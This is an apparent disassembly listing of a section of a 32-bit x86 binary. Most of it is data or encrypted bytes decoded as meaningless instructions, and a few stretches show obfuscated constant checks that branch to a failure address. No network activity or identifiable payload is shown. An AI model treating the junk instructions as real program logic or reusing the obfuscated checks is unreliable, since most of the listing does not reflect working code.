  4018f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4018fa:	mov    ds:0xe5919255,eax
  4018ff:	and    al,0x96
  401901:	pand   mm7,QWORD PTR [eax+edi*8+0x1]
  401906:	push   es
  401907:	jg     0x401928
  401909:	mov    dl,0x6b
  40190b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40190c:	jb     0x4018b0
  40190e:	aam    0x10
  401910:	test   BYTE PTR [ebp-0x71713e6c],dh
  401916:	add    dh,BYTE PTR [esi+0x2f1fa919]
  40191c:	test   DWORD PTR [ebx+eiz*2+0x15],eax
  401920:	cs jae 0x4018c9
  401923:	fstp   DWORD PTR [edx-0xcff5a59]
  401929:	push   DWORD PTR [edx+0xc]
  40192c:	out    dx,eax
  40192d:	lds    esi,FWORD PTR [ecx+0x35]
  401930:	jno    0x40191e
  401932:	in     al,0x8e
  401934:	imul   edx,DWORD PTR [ecx+0x2d],0xffffff8a
  401938:	dec    ebp
  401939:	sbb    dh,BYTE PTR [ebx+0x34]
  40193c:	jnp    0x40196e
  40193e:	adc    al,0xe5
  401940:	dec    edx
  401941:	xchg   BYTE PTR [eax+0xb],cl
  401944:	jbe    0x40197f
  401946:	mov    ds:0x7197c2a,al
  40194b:	jl     0x4018d6
  40194d:	inc    ebp
  40194e:	in     al,0x8b
  401950:	inc    ebp
  401951:	in     al,0xc7
  401953:	add    BYTE PTR [ecx-0x740760d3],ch
  401959:	inc    ebp
  40195a:	in     al,dx
  40195b:	mov    ebx,DWORD PTR [ebp-0x8]
  40195e:	xor    eax,ecx
  401960:	xor    ebx,ecx
  401962:	xor    edx,edx
  401964:	add    eax,esi
  401966:	add    ebx,esi
  401968:	div    ebx
  40196a:	mov    edx,DWORD PTR [ebp-0x2c]
  40196d:	cmp    eax,DWORD PTR [edx]
  40196f:	je     0x40271e
  401975:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40197c:	lea    eax,[ebp-0xc]
  40197f:	mov    DWORD PTR [ebp-0x10],eax
  401982:	jmp    0x401b9f
  401987:	int3   
  401988:	sub    eax,0xbde9be20
  40198d:	push   0xffffffa9
  40198f:	mov    ebp,0xe67bf628
  401994:	fucomp st(4)
  401996:	mov    esi,0x70707a70
  40199b:	jo     0x401a1b
  40199d:	jo     0x401a0f
  40199f:	js     0x401959
  4019a1:	(bad)  [ecx+0x75]
  4019a4:	push   eax
  4019a5:	xchg   esp,eax
  4019a6:	pop    ecx
  4019a7:	mov    fs,ebp
  4019a9:	repz and BYTE PTR ds:0x9c024de5,0xcd
  4019b1:	mov    ah,0x64
  4019b3:	pop    esi
  4019b5:	cdq    
  4019b6:	and    dl,BYTE PTR [ecx-0x5a73010e]
  4019bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019bd:	sahf   
  4019be:	dec    edi
  4019bf:	and    cl,BYTE PTR [ebx-0x33ed5a3f]
  4019c5:	sub    eax,0xa0464601
  4019ca:	dec    esp
  4019cb:	dec    edx
  4019cc:	out    dx,eax
  4019cd:	push   edx
  4019ce:	sub    DWORD PTR [edi+0x195596ae],edi
  4019d4:	aam    0x8f
  4019d6:	int3   
  4019d7:	pop    esi
  4019d8:	mov    al,0xf4
  4019da:	push   ebp
  4019db:	mov    al,ds:0x2ead51e4
  4019e0:	(bad)  
  4019e1:	rol    DWORD PTR [ebp+esi*1+0x24],cl
  4019e5:	vpmacssdql ymm6,ymm4,ymm5,YMMWORD PTR [esi-0x45]
  4019ec:	cwde   
  4019ed:	or     al,0xbb
  4019ef:	das    
  4019f0:	sbb    ecx,esp
  4019f2:	ss inc ecx
  4019f4:	cdq    
  4019f5:	outs   dx,DWORD PTR ds:[esi]
  4019f6:	nop
  4019f7:	enter  0xf6fb,0xc7
  4019fb:	inc    esi
  4019fc:	xchg   edx,eax
  4019fd:	push   esi
  4019fe:	sbb    dh,BYTE PTR [ebx]
  401a00:	inc    esi
  401a01:	test   al,0xe4
  401a03:	pop    edi
  401a04:	pop    ds
  401a05:	cmp    DWORD PTR [ebp+0x38615e24],ebx
  401a0b:	jmp    0x3c66:0x551d6bbc
  401a12:	shl    DWORD PTR ds:0xb6a4b11,cl
  401a18:	shr    DWORD PTR [edx-0x6af35f91],1
  401a1e:	cmp    esi,DWORD PTR [ebp+0x7e]
  401a21:	mov    ah,0x7
  401a23:	rol    DWORD PTR [esi+0x56],0x34
  401a27:	ss (bad) 
  401a29:	dec    eax
  401a2a:	test   BYTE PTR [ebp-0x59434748],cl
  401a30:	sbb    ah,BYTE PTR [ecx-0x38612790]
  401a36:	cmp    ecx,DWORD PTR [ebp-0x62]
  401a39:	icebp  
  401a3a:	data16 and al,0x7b
  401a3d:	imul   ebx,eax,0x21
  401a40:	pop    eax
  401a41:	js     0x4019fd
  401a43:	mov    bl,bl
  401a45:	stos   DWORD PTR es:[edi],eax
  401a46:	cmp    esi,DWORD PTR [ecx+esi*8-0x6b]
  401a4a:	or     DWORD PTR [ebx],eax
  401a4c:	mov    bl,0x97
  401a4e:	out    0xcf,eax
  401a50:	(bad)  
  401a51:	adc    dl,BYTE PTR [edi+0x5e30c8eb]
  401a57:	or     bh,BYTE PTR [eax]
  401a59:	lock ja 0x401a4b
  401a5c:	cmp    eax,ecx
  401a5e:	mov    ebp,0x43093ad8
  401a63:	push   ds
  401a64:	outs   dx,BYTE PTR ds:[esi]
  401a65:	xor    bh,ch
  401a67:	mov    ebp,0xf73da564
  401a6c:	fxch   st(2)
  401a6e:	addr16 pop ds
  401a70:	inc    edi
  401a71:	or     DWORD PTR [eax+esi*4+0x59bad6e0],edi
  401a78:	push   bx
  401a7a:	mov    ah,0x49
  401a7c:	cld    
  401a7d:	adc    al,BYTE PTR [ecx-0x22ac7c98]
  401a83:	std    
  401a84:	aad    0xf6
  401a86:	mov    edi,0xc600abb9
  401a8b:	dec    esp
  401a8c:	xor    BYTE PTR [eax-0x6bdf496],dh
  401a92:	popa   
  401a93:	mov    edx,DWORD PTR [edi-0x3a]
  401a96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a97:	mov    eax,0x9df57f57
  401a9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a9d:	mov    esp,0xa8c0571b
  401aa2:	add    BYTE PTR [ebx-0x3c],al
  401aa5:	xchg   ebx,eax
  401aa6:	dec    edx
  401aa7:	ret    0xd678
  401aaa:	sar    DWORD PTR [edi-0x384d7bec],0x18
  401ab1:	jbe    0x401acb
  401ab3:	(bad)  
  401ab4:	cmp    DWORD PTR [ebp+0x362b7c83],edx
  401aba:	push   ss
  401abb:	loopne 0x401a95
  401abd:	xor    eax,0xac0a0bd3
  401ac2:	(bad)  
  401ac4:	xor    eax,DWORD PTR [ebx+0x33ab3200]
  401aca:	mov    edx,0x7e82aa28
  401acf:	fs rcr DWORD PTR gs:[edi-0x3db728f5],1
  401ad7:	aaa    
  401ad8:	fucomi st,st(2)
  401ada:	mov    BYTE PTR [ebp+0x1],dl
  401add:	add    BYTE PTR [esi+0x441b110d],dl
  401ae3:	imul   edi
  401ae5:	and    DWORD PTR [ecx-0x39],edx
  401ae8:	int    0xa
  401aea:	pop    ss
  401aeb:	sbb    cl,BYTE PTR [ebp-0x4acecfde]
  401af1:	test   BYTE PTR [eax],ch
  401af3:	lods   al,BYTE PTR ds:[esi]
  401af4:	arpl   WORD PTR [eax],bp
  401af6:	jb     0x401b29
  401af8:	js     0x401ac2
  401afa:	inc    esi
  401afb:	imul   edi,ebp,0xffffffe9
  401afe:	push   cs
  401aff:	stc    
  401b00:	and    BYTE PTR [esp+edi*1],al
  401b03:	test   al,0x7d
  401b05:	mov    bh,0xed
  401b07:	fdivr  DWORD PTR [ebx+0x1f]
  401b0a:	jl     0x401afb
  401b0c:	clc    
  401b0d:	jae    0x401b83
  401b0f:	dec    esp
  401b10:	addr16 sti 
  401b12:	push   ds
  401b13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b14:	shl    BYTE PTR ds:0xf6747243,cl
  401b1a:	jnp    0x401b35
  401b1c:	or     ebx,DWORD PTR [ecx+edx*2-0x7c]
  401b20:	push   eax
  401b21:	push   esi
  401b22:	add    eax,0xf4790c33
  401b27:	push   ebp
  401b28:	push   edx
  401b29:	ins    DWORD PTR es:[edi],dx
  401b2a:	pusha  
  401b2b:	mov    al,BYTE PTR [ecx]
  401b2d:	xchg   edi,eax
  401b2e:	clc    
  401b2f:	push   esp
  401b30:	and    esp,DWORD PTR [ebx+edx*1]
  401b33:	call   0x16b4:0xf02d66ba
  401b3a:	into   
  401b3b:	dec    ecx
  401b3c:	pushf  
  401b3d:	out    dx,eax
  401b3e:	xlat   BYTE PTR ds:[ebx]
  401b3f:	jmp    0x1340f30a
  401b44:	inc    eax
  401b45:	push   edi
  401b46:	jp     0x401ac8
  401b48:	fimul  WORD PTR [ebx]
  401b4a:	hlt    
  401b4b:	addr16 in eax,dx
  401b4d:	fwait
  401b4e:	shl    dl,0x28
  401b51:	test   BYTE PTR [esi-0x3ad63032],ah
  401b57:	(bad)  
  401b58:	pop    es
  401b59:	adc    eax,0x9dc7cb1f
  401b5e:	add    ebp,ebp
  401b60:	jmp    0x31170b5f
  401b65:	lods   al,BYTE PTR ds:[esi]
  401b66:	adc    DWORD PTR [eax-0x2a],ecx
  401b69:	imul   ebp,DWORD PTR [edi-0x4c93ea46],0xa0bbdca9
  401b73:	push   0x35
  401b75:	movhps xmm6,QWORD PTR [edi+ecx*8]
  401b79:	push   ss
  401b7a:	in     eax,dx
  401b7b:	lahf   
  401b7c:	jnp    0x401b35
  401b7e:	lds    edx,FWORD PTR [edx]
  401b80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b81:	pop    eax
  401b82:	dec    esi
  401b83:	sub    ah,ch
  401b85:	loop   0x401b99
  401b87:	daa    
  401b88:	mov    al,ds:0x7290e1b7
  401b8d:	xor    al,0xea
  401b8f:	mov    edi,DWORD PTR ds:0x8235a0a9
  401b95:	jle    0x401b4e
  401b97:	push   es
  401b98:	mov    ds:0xc69a715d,eax
  401b9d:	dec    ecx
  401b9e:	repz mov eax,DWORD PTR [ebp-0x10]
  401ba2:	mov    edx,DWORD PTR [eax]
  401ba4:	imul   edx,edx,0xf89ea9ec
  401baa:	mov    DWORD PTR [eax],edx
  401bac:	mov    eax,DWORD PTR [ebp-0xc]
  401baf:	cmp    eax,0x742b26d4
  401bb4:	je     0x401bc8
  401bba:	mov    eax,DWORD PTR [ebp-0x1c]
  401bbd:	or     DWORD PTR [eax],0x60751c9c
  401bc3:	jmp    0x40272d
  401bc8:	mov    eax,DWORD PTR [ebp-0xc]
  401bcb:	jmp    0x401de8
  401bd0:	popa   
  401bd1:	ja     0x401bca
  401bd3:	add    esi,ecx
  401bd5:	xor    DWORD PTR [ecx+0x75],0xffffffde
  401bd9:	adc    al,0xb4
  401bdb:	mov    al,BYTE PTR [ecx]
  401bdd:	inc    ebx
  401bde:	scas   al,BYTE PTR es:[edi]
  401bdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401be0:	jo     0x401c5a
  401be2:	jo     0x401c54
  401be4:	jo     0x401c64
  401be6:	jo     0x401c58
  401be8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401be9:	fcomp  st(7)
  401beb:	loop   0x401b82
  401bed:	push   ebp
  401bee:	das    
  401bef:	in     al,0x7a
  401bf1:	xchg   ebp,eax
  401bf2:	and    al,0x3b
  401bf4:	fimul  DWORD PTR [edi]
  401bf6:	cmp    BYTE PTR [ebp+0xb94bd32],ch
  401bfc:	jl     0x401bcd
  401bfe:	div    BYTE PTR [edi+0x39945831]
  401c04:	pop    esp
  401c05:	sbb    ebx,DWORD PTR [edx-0x4d7be1ff]
  401c0b:	mov    es,WORD PTR [esi]
  401c0d:	mov    al,ds:0x3fcced94
  401c12:	mov    esi,0xde24621
  401c17:	sub    al,0x74
  401c19:	mov    al,0xca
  401c1b:	add    al,0x4a
  401c1d:	scas   al,BYTE PTR es:[edi]
  401c1e:	xchg   BYTE PTR [esi+0x4cb93eb],bl
  401c24:	retf   0x5df7
  401c27:	(bad)  
  401c28:	sbb    eax,0x85b0c3a6
  401c2d:	fist   WORD PTR [esi+0x1a]
  401c30:	xchg   edx,eax
  401c31:	out    dx,al
  401c32:	out    0xeb,eax
  401c34:	(bad)  
  401c35:	fiadd  DWORD PTR [edi]
  401c37:	cmp    ebx,DWORD PTR [edi-0x2fdbb8f5]
  401c3d:	test   al,0x8f
  401c3f:	rsm    
  401c41:	iret   
  401c42:	(bad)  
  401c43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c44:	(bad)  
  401c45:	cmp    BYTE PTR [ecx],al
  401c47:	jns    0x401c50
  401c49:	dec    edi
  401c4a:	addr16 pop ds
  401c4c:	mov    al,ds:0xcfc53db8
  401c51:	scas   al,BYTE PTR es:[edi]
  401c52:	pop    ecx
  401c53:	mov    eax,0x3e31d641
  401c58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c59:	and    BYTE PTR [ebx],0x80
  401c5c:	xor    ah,BYTE PTR [eax+esi*1+0x42]
  401c60:	pop    edi
  401c61:	xchg   edx,eax
  401c62:	mov    ?,WORD PTR [ebx-0x3d5a0bfb]
  401c68:	add    eax,0x56752d95
  401c6d:	stos   BYTE PTR es:[edi],al
  401c6e:	pop    ecx
  401c6f:	test   al,0x20
  401c71:	sub    DWORD PTR [ebp-0x4],esi
  401c74:	push   edi
  401c75:	das    
  401c76:	mov    dh,0xe1
  401c78:	adc    ebx,ecx
  401c7a:	pop    ebx
  401c7b:	xor    eax,eax
  401c7d:	cmp    eax,0xa3bbea76
  401c82:	adc    DWORD PTR [ecx+0xc],ecx
  401c85:	mov    ebx,0x2ca65207
  401c8a:	call   FWORD PTR fs:[esp+ebp*2]
  401c8e:	xor    al,bl
  401c90:	mov    ecx,0x20821ebd
  401c95:	cdq    
  401c96:	mov    bl,ah
  401c98:	sub    BYTE PTR [ebp-0x41],al
  401c9b:	cmp    cl,bh
  401c9d:	sahf   
  401c9e:	cmp    BYTE PTR [eax-0x56],cl
  401ca1:	pop    eax
  401ca2:	lods   eax,DWORD PTR ds:[esi]
  401ca3:	sbb    eax,0x4e4ccdd6
  401ca8:	or     al,BYTE PTR [esi-0x20]
  401cab:	fimul  DWORD PTR [eax]
  401cad:	mov    eax,ds:0x75c83a80
  401cb2:	xchg   ecx,eax
  401cb3:	xchg   esi,eax
  401cb4:	out    dx,eax
  401cb5:	lock imul ebp,DWORD PTR [ebp-0xac46948],0xffffffd2
  401cbd:	push   0x89c8ca21
  401cc2:	out    dx,eax
  401cc3:	fs sbb al,0xe1
  401cc6:	mov    ah,0x94
  401cc8:	add    ah,bl
  401cca:	repnz mov bl,0x71
  401ccd:	lds    ebp,FWORD PTR [ebp-0x73]
  401cd0:	(bad)  [ebx-0x4efebede]
  401cd6:	push   ss
  401cd7:	add    ch,BYTE PTR [edx]
  401cd9:	cwde   
  401cda:	rcr    DWORD PTR ds:0xf71ff8ad,1
  401ce0:	imul   esi,DWORD PTR [edi+0x7e4ca09],0xffffffd4
  401ce7:	jmp    0x9f4a0d8a
  401cec:	jecxz  0x401c71
  401cee:	pusha  
  401cef:	pop    es
  401cf0:	pop    ecx
  401cf1:	xchg   esp,eax
  401cf2:	jnp    0x401c89
  401cf4:	mov    cl,0x5d
  401cf6:	push   esp
  401cf7:	xchg   ebp,eax
  401cf8:	std    
  401cf9:	int3   
  401cfa:	mov    eax,ds:0x694ef827
  401cff:	xchg   ebp,eax
  401d00:	outs   dx,DWORD PTR ds:[esi]
  401d01:	fldenv [eax]
  401d03:	inc    eax
  401d04:	pop    ecx
  401d05:	adc    eax,0x15b8b3bd
  401d0a:	shl    esi,0xb3
  401d0d:	push   esp
  401d0e:	(bad)  
  401d0f:	div    DWORD PTR [ebx-0xb]
  401d12:	aam    0xc0
  401d14:	test   al,0xc1
  401d16:	sahf   
  401d17:	sbb    al,ah
  401d19:	push   edi
  401d1a:	xor    BYTE PTR [edi+ebp*1-0xf9a055],dh
  401d21:	add    BYTE PTR [si+0x22],ch
  401d25:	mov    dh,0xe6
  401d28:	(bad)  
  401d29:	sub    eax,0x7eb5da75
  401d2e:	ror    cl,cl
  401d30:	mov    ebx,0x6b4f960e
  401d35:	in     eax,dx
  401d36:	cli    
  401d37:	adc    al,0x37
  401d39:	sbb    eax,0x851f09f6
  401d3e:	clc    
  401d3f:	mov    al,ds:0xfe02f0a8
  401d44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d45:	lods   eax,DWORD PTR ds:[esi]
  401d46:	outs   dx,BYTE PTR ds:[esi]
  401d47:	mov    edi,0xc9ff0180
  401d4c:	clc    
  401d4d:	jb     0x401d5d
  401d4f:	xchg   BYTE PTR [ebx+0x72],dl
  401d52:	xchg   edx,eax
  401d53:	xchg   ecx,eax
  401d54:	enter  0x2948,0x31
  401d58:	loope  0x401db3
  401d5a:	mov    esp,0xb99caa34
  401d5f:	in     eax,0x83
  401d61:	cmp    ah,BYTE PTR [ecx]
  401d63:	xchg   esp,eax
  401d64:	sbb    eax,0xda26114e
  401d69:	loopne 0x401d61
  401d6b:	sar    DWORD PTR [edi],cl
  401d6d:	pop    ebx
  401d6e:	test   ebx,ebp
  401d70:	cmp    al,0x7f
  401d72:	(bad)  
  401d73:	xchg   ebx,eax
  401d74:	or     bl,dh
  401d76:	outs   dx,DWORD PTR ds:[esi]
  401d77:	xchg   ecx,eax
  401d78:	pop    ebx
  401d79:	xor    bh,BYTE PTR [ecx+0x15]
  401d7c:	jbe    0x401dd1
  401d7e:	das    
  401d7f:	mov    cl,0x77
  401d81:	pop    edx
  401d82:	aas    
  401d83:	inc    esp
  401d84:	pop    esp
  401d85:	xchg   bl,ah
  401d87:	push   ebp
  401d88:	add    al,BYTE PTR [esi+0x38]
  401d8b:	xchg   BYTE PTR [edi+ecx*4],ah
  401d8e:	push   ss
  401d8f:	jecxz  0x401e06
  401d91:	push   ebp
  401d92:	and    eax,0x7c02efc
  401d97:	cmp    DWORD PTR [edi-0x4d],ebp
  401d9a:	add    al,0xb
  401d9c:	div    BYTE PTR [esi+0x9]
  401d9f:	out    0x1f,al
  401da1:	dec    esp
  401da2:	dec    esi
  401da3:	mov    al,0xe7
  401da5:	inc    esp
  401da6:	ja     0x401d31
  401da8:	out    0x9,eax
  401daa:	in     eax,0xf5
  401dac:	shl    DWORD PTR [edi-0x27432a38],1
  401db2:	mov    es,WORD PTR [edi+0x56]
  401db5:	push   0xe9d826e9
  401dba:	ss iret 
  401dbc:	clc    
  401dbd:	clc    
  401dbe:	imul   ebx,DWORD PTR [ebp+0x7b],0xc241b432
  401dc5:	xchg   ebx,eax
  401dc6:	loopne 0x401d57
  401dc8:	lods   al,BYTE PTR ds:[esi]
  401dc9:	xor    al,0x76
  401dcb:	and    BYTE PTR [ecx+edi*1],0xf3
  401dcf:	jne    0x401e31
  401dd1:	pop    ss
  401dd2:	mov    ds:0x5ac68cd6,al
  401dd7:	mov    eax,ds:0x9f0bcc53
  401ddc:	out    dx,eax
  401ddd:	popa   
  401dde:	xchg   edx,eax
  401ddf:	push   cs
  401de0:	stos   BYTE PTR es:[edi],al
  401de1:	and    eax,0x28abf0f7
  401de6:	jmp    0x401dc4
  401de8:	add    eax,DWORD PTR [ebp-0x18]
  401deb:	cmp    eax,0x6cca547d
  401df0:	je     0x401e04
  401df6:	mov    eax,DWORD PTR [ebp-0x10]
  401df9:	and    DWORD PTR [eax],0x751c99
  401dff:	jmp    0x40272d
  401e04:	mov    eax,DWORD PTR [ebp-0xc]
  401e07:	mov    edx,DWORD PTR [ebp-0x18]
  401e0a:	or     eax,edx
  401e0c:	cmp    eax,0xfcbf2ffd
  401e11:	je     0x401e25
  401e17:	mov    eax,DWORD PTR [ebp-0x10]
  401e1a:	xor    DWORD PTR [eax],0x2650fa8f
  401e20:	jmp    0x40272d
  401e25:	mov    ax,WORD PTR [ebp-0x4]
  401e29:	mov    edx,0x8a3e
  401e2e:	xor    ax,dx
  401e31:	jmp    0x40204e
  401e36:	cld    
  401e37:	test   BYTE PTR [edx+0x3d],ch
  401e3a:	jb     0x401e31
  401e3c:	stos   DWORD PTR es:[edi],eax
  401e3d:	inc    ecx
  401e3e:	inc    eax
  401e3f:	(bad)  
  401e40:	cmp    BYTE PTR [eax+eiz*8-0xd],dl
  401e44:	fwait
  401e45:	scas   eax,DWORD PTR es:[edi]
  401e46:	jo     0x401e4e
  401e48:	jo     0x401eba
  401e4a:	jo     0x401eca
  401e4c:	jo     0x401ebe
  401e4e:	and    BYTE PTR [esi+0x47],ch
  401e51:	xor    DWORD PTR [ebx+0x35],esi
  401e54:	out    dx,eax
  401e55:	sbb    eax,0x55bbf8ec
  401e5a:	xchg   edx,eax
  401e5b:	bound  edx,QWORD PTR [ecx+0x2f]
  401e5e:	les    ebp,FWORD PTR [edi+0x32ac0888]
  401e64:	sbb    cl,bl
  401e66:	rcl    DWORD PTR ds:0xcbe16ab7,cl
  401e6c:	sbb    bl,BYTE PTR [ebp-0x47b7643b]
  401e72:	leave  
  401e73:	stc    
  401e74:	cs cs test eax,0xe8cf8f27
  401e7b:	(bad)  
  401e7d:	xor    DWORD PTR [esi],esp
  401e7f:	xchg   edi,eax
  401e80:	data16 add al,dh
  401e83:	rol    DWORD PTR [ebx],0x11
  401e86:	(bad)  
  401e87:	scas   al,BYTE PTR es:[edi]
  401e88:	pop    ds
  401e89:	dec    edi
  401e8a:	mov    eax,0x6f0d9bdf
  401e8f:	sub    ch,0x8c
  401e92:	cld    
  401e93:	lahf   
  401e94:	data16 sbb dh,bl
  401e97:	add    al,0x46
  401e99:	and    DWORD PTR [ebp+0x75],esp
  401e9c:	cmp    edx,DWORD PTR [ebx]
  401e9e:	fmul   st,st(2)
  401ea0:	xor    al,0xd5
  401ea2:	pop    edx
  401ea3:	js     0x401e3f
  401ea5:	outs   dx,BYTE PTR ds:[esi]
  401ea6:	xchg   ebx,eax
  401ea7:	imul   ebp,ebp,0x29
  401eaa:	sbb    dl,BYTE PTR ds:0xb905d3da
  401eb0:	sbb    bl,0x4c
  401eb3:	xor    bl,cl
  401eb5:	repz sar BYTE PTR [esi],1
  401eb8:	jecxz  0x401e9b
  401eba:	push   ds
  401ebb:	add    dh,0xe0
  401ebe:	adc    DWORD PTR fs:[ebp-0x440f57c3],ebx
  401ec5:	xchg   edi,eax
  401ec6:	cmp    al,0x45
  401ec8:	jmp    0x96a5:0x4d6922a1
  401ecf:	mov    ds:0xd8be7107,eax
  401ed4:	cmp    BYTE PTR [esi],al
  401ed6:	pop    ss
  401ed7:	les    cx,DWORD PTR [edx-0x36]
  401edb:	xchg   esi,eax
  401edc:	fwait
  401edd:	in     eax,0xfc
  401edf:	faddp  st(5),st
  401ee1:	fdivr  st(6),st
  401ee3:	pop    esi
  401ee4:	pop    esi
  401ee5:	jge    0x401ece
  401ee7:	mov    bh,0xed
  401ee9:	dec    esi
  401eea:	fnsave [edx+0x17]
  401eed:	pop    edx
  401eee:	jno    0x401eb6
  401ef0:	cmc    
  401ef1:	mov    esp,0x973b7dd9
  401ef6:	aas    
  401ef7:	mov    WORD PTR [edx-0x1d],gs
  401efa:	cld    
  401efb:	shr    BYTE PTR [ebx-0x7d0176a1],1
  401f01:	sub    al,0x25
  401f03:	fadd   DWORD PTR [edi-0x3c]
  401f06:	fsubr  DWORD PTR [edi]
  401f08:	lahf   
  401f09:	or     ch,ch
  401f0b:	xchg   ebp,eax
  401f0c:	mov    edi,DWORD PTR [ecx-0x3e460c89]
  401f12:	inc    edi
  401f13:	iret   
  401f14:	sbb    ebp,esi
  401f16:	mov    dl,0xe0
  401f18:	inc    ebp
  401f19:	clc    
  401f1a:	or     DWORD PTR [eax+ebx*1],eax
  401f1d:	xor    DWORD PTR [ecx],0xffffffc4
  401f20:	push   ds
  401f21:	and    ah,ah
  401f23:	int    0xf6
  401f25:	inc    edi
  401f26:	jo     0x401ebf
  401f28:	add    eax,0x1cb590ab
  401f2d:	xchg   ebx,eax
  401f2e:	(bad)  
  401f30:	aas    
  401f31:	retf   0xc2bc
  401f34:	out    0xe8,eax
  401f36:	dec    eax
  401f37:	idiv   bl
  401f39:	cmp    bh,BYTE PTR [edi+0x3a]
  401f3c:	fs cmp eax,0x2902b5fe
  401f42:	dec    ebp
  401f43:	call   0xd8ef5ead
  401f48:	cmp    eax,0x1c6eff23
  401f4d:	pop    ebx
  401f4e:	mov    ebx,DWORD PTR [edi]
  401f50:	and    dl,al
  401f52:	push   ebx
  401f53:	iret   
  401f54:	mov    cl,0x76
  401f56:	sub    BYTE PTR [ebx],bh
  401f58:	sub    eax,esp
  401f5a:	add    bl,BYTE PTR [ebp+0x341a1b10]
  401f60:	sbb    bl,BYTE PTR [ebx+0x153d550d]
  401f66:	xchg   esi,eax
  401f67:	add    ebx,DWORD PTR [esi+0x582e7a82]
  401f6d:	xchg   ecx,eax
  401f6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f6f:	fbld   TBYTE PTR [esi-0x2962d332]
  401f75:	lock sbb ebx,edi
  401f78:	pop    fs
  401f7a:	xchg   edi,eax
  401f7b:	int    0x63
  401f7d:	ins    DWORD PTR es:[edi],dx
  401f7e:	push   0x2a
  401f80:	push   ss
  401f81:	jp     0x401f48
  401f83:	xchg   esi,eax
  401f84:	test   DWORD PTR [edi+0x298358a9],esp
  401f8a:	cs (bad) 
  401f8c:	test   eax,0x2e62284f
  401f91:	dec    ebp
  401f92:	push   cs
  401f93:	mov    dh,0x42
  401f95:	jbe    0x402004
  401f97:	mov    eax,ds:0x539b2297
  401f9c:	add    esp,DWORD PTR [edx-0x5d]
  401f9f:	dec    ebx
  401fa0:	enter  0x9791,0xef
  401fa4:	mov    dh,0x18
  401fa6:	iret   
  401fa7:	ins    BYTE PTR es:[edi],dx
  401fa8:	out    0x56,eax
  401faa:	pop    ebp
  401fab:	mov    bh,0x13
  401fad:	adc    edi,DWORD PTR [ecx+esi*4]
  401fb0:	ds mov eax,0x6de84f9e
  401fb6:	pop    ecx
  401fb7:	aas    
  401fb8:	test   eax,eax
  401fba:	jmp    0x401f78
  401fbc:	es stos DWORD PTR es:[edi],eax
  401fbe:	push   ebp
  401fbf:	jb     0x401f55
  401fc1:	xchg   ebx,eax
  401fc2:	mov    bl,0x76
  401fc4:	jae    0x401fd9
  401fc6:	xchg   esi,eax
  401fc7:	dec    edi
  401fc8:	and    DWORD PTR [eax-0x60],ecx
  401fcb:	or     dl,BYTE PTR [ebp-0x47]
  401fce:	or     ebp,DWORD PTR [eax]
  401fd0:	retf   0x41eb
  401fd3:	mov    eax,ds:0xf20c1b0d
  401fd8:	je     0x401fd3
  401fda:	aas    
  401fdb:	pop    edx
  401fdc:	dec    esi
  401fdd:	push   ss
  401fde:	mov    ebp,0x3740725a
  401fe3:	cmc    
  401fe4:	push   ds
  401fe5:	imul   esi,DWORD PTR [esp+esi*1+0x3f14dea4],0x7d
  401fed:	rcl    BYTE PTR [ecx-0x52819d27],0x61
  401ff4:	addr16 mov ch,0xec
  401ff7:	stc    
  401ff8:	leave  
  401ff9:	mov    ds:0xb012ba5b,eax
  401ffe:	int    0x66
  402000:	ret    
  402001:	call   0x83d0:0x9c5edcf0
  402008:	jo     0x402045
  40200a:	push   eax
  40200b:	fcmovbe st,st(6)
  40200d:	ret    
  40200e:	jns    0x40204b
  402010:	das    
  402011:	data16 out dx,al
  402013:	loop   0x40208c
  402015:	test   BYTE PTR [edx-0x9cec48d],0x30
  40201c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40201d:	rcl    cl,0x33
  402020:	fwait
  402021:	aad    0xc8
  402023:	push   es
  402024:	das    
  402025:	ins    BYTE PTR es:[edi],dx
  402026:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  402028:	jae    0x402066
  40202a:	aam    0xad
  40202c:	imul   ebp,DWORD PTR [ecx+0x783969af],0xa89ce00a
  402036:	pusha  
  402037:	adc    bl,BYTE PTR [edi+0x4f]
  40203a:	sbb    ch,al
  40203c:	stos   BYTE PTR es:[edi],al
  40203d:	and    al,0xc5
  40203f:	std    
  402040:	aam    0xb3
  402042:	lahf   
  402043:	push   es
  402044:	add    al,0x9f
  402046:	cmp    esi,DWORD PTR [ecx]
  402048:	pushf  
  402049:	xor    BYTE PTR [esi-0x7408d3bd],ah
  40204f:	push   ebp
  402050:	fmul   DWORD PTR [ebx-0x38fc99ee]
  402056:	cmp    ax,WORD PTR [edx]
  402059:	jmp    0x402276
  40205e:	ret    0x801a
  402061:	gs push 0xfb99f171
  402067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402068:	ins    BYTE PTR es:[edi],dx
  402069:	or     BYTE PTR [ebp+0x702e28ab],0x4
  402070:	jo     0x4020e2
  402072:	jo     0x4020f2
  402074:	jo     0x4020e6
  402076:	mov    ecx,0xbd53e886
  40207b:	repz pop esi
  40207d:	ss xchg edi,eax
  40207f:	mov    edi,DWORD PTR [eax]
  402081:	imul   edi,DWORD PTR [edi+0x7cf5630a],0xcd34e530
  40208b:	enter  0x9f38,0xce
  40208f:	adc    BYTE PTR [edi-0x56bb080],ch
  402095:	push   ecx
  402096:	pop    ss
  402097:	inc    DWORD PTR [esi+0x8481703]
  40209d:	inc    edx
  40209e:	xor    eax,ecx
  4020a0:	stos   DWORD PTR es:[edi],eax
  4020a1:	xor    bh,BYTE PTR [edx]
  4020a3:	xchg   ecx,eax
  4020a4:	fs sbb eax,esp
  4020a7:	inc    ebp
  4020a8:	pop    edx
  4020a9:	daa    
  4020aa:	dec    ebx
  4020ab:	dec    edx
